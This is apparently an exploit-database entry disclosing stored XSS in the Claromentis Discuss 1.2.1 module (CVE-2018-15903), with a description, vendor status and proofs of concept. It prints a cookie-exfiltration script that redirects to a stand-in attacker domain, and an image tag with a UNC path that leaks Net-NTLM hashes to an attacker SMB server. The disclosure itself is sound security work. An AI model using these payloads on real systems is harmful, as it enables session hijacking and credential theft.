@@ -1,0 +1,118 @@
+id: 31261
+date: 10/06/2018
+title: Claromentis Discuss 1.2.1 Cross Site Scripting Vulnerability
+author: David Vargas
+cves: CVE-2018-15903
+
+Issue: Stored Cross site Scripting (XSS) on Discuss Module v1.2.1 in
+Claromentis intranet application
+
+Reserved CVE: CVE-2018-15903
+
+# Vulnerability OverviewThe Discuss v1.2.1 module in Claromentis 8.2.2
+is vulnerable to Stored Cross Site Scripting (XSS). An authenticated
+attacker is able to place malicious JavaScript in the discussion
+forum, which is present in the login landing page. A low privilege
+user can use this to steal the session cookies from high privilege
+accounts to conduct session hijacking, enabling them to hijack the
+elevated session and perform actions in their security context.
+
+# Discovered By
+David Vargas @ HackLabs
+
+# Vendor Status
+Disclosed to the Claromentis security team. Discuss module was patched
+within two weeks of disclosure.
+
+# Vulnerability Details
+Attack type: Remote, authenticated
+Impact: Information disclosure, session hijacking, possible domain
+hash disclosure.
+
+Affected component: Tested on Claromentis Discuss Module v1.2.1.
+Presumably all previous versions also affected.
+Claromentis version affected: Tested on 8.2.2.
+
+Attack vector: XSS
+
+# Technical Overview
+Claromentis provides Intranet software hosted for organisations. Many
+different modules can be enabled to provide different functionality
+within the application. One of these Modules is the Discuss module,
+which allows forum style discussions between authenticated users.
+
+
+The Discuss module was found to not enforce any sort of character
+filtering or encoding, and vulnerable to stored cross site scripting.
+Rather than strip or encode special characters, the Discuss module
+simply takes the HTML input and echoes it out in the post, allowing us
+to inject simple payloads such as <script>alert(1)</script>.
+
+
+The risk is amplified because the application also fails to set the
+httponly flag on the session cookie (PHPSESSID), which facilitates
+session hijacking attacks. Furthermore, the Discuss module is present
+on the landing page for successful logins, which means every user that
+authenticates to the application or navigates to the home page would
+be a potential victim to session hijacking or potentially Net-NTLM
+hash stealing.
+
+
+# POC 1: Session Hijacking
+
+To demonstrate the ability to steal session cookies, the following
+payload can be used:
+
+
+```
+
+<script>alert(document.cookie)</script>
+
+```
+
+
+The above is the classic PoC which will produce an pop up box with the
+document cookies, including the PHPSESSID session cookie.
+
+
+In practice, this payload would be little value to an attacker. A
+malicious actor would use something like the payload below to send the
+cookies to a server they control:
+
+
+```
+
+<script>
+
+document.location='https://evil-domain.com/cookie_catcher.php?cookie='+document.cookie;
+
+</script>
+
+```
+
+
+This would send the current session cookies to the attacker's domain,
+allowing them to hijack different sessions and execute actions in the
+application within the victim's security context.
+
+# POC 2: Collecting domain credentials
+
+Claromentis allows and supports the use of Active directory for
+authentication, which means the vulnerability could be easily leveraged to
+redirect to a fake authentication page in order to trick the victim into
+divulging domain credentials. Alternatively, if the perimeter firewalls
+allow outbound traffic to TCP 445, or if the attacker is in the network,
+the following payload can also be used to silently steal Net-NTLM Hashes
+from the target:
+
+```
+<img src="\\x.x.x.x\doesnotexist" />
+```
+
+Where x.x.x.x is the IP address of an evil SMB server. Internet explorer
+and other browsers support UNC paths, which will cause the above payload to
+try to authenticate to the evil SMB server in order to access the
+*doesnotexist* share, resulting in the disclosure of user hashes which
+could be then be cracked.
+
+#  0day.today [2023-03-24]  #
